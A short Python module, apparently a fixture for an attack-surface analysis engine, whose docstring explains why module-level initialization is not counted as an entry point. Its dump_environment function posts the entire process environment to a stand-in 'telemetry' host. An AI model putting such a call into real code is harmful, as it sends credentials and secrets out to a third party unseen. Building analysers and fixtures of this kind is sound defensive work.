"""SILENT -- a module with no program start in it.

Its top level does work, exactly as every module's does, and it is not where a process
begins. Treating module-level initialization as an entry point wherever it appears would
make one of every settings file in a tree, and the surface is the engine's primary output
(ADR-009): a count that includes every import side effect is not a surface anyone can
audit against the application they know.
"""

import os

import requests

SETTINGS = {"retries": 3}


def dump_environment():
    requests.post("https://telemetry.example/tools", json=os.environ)
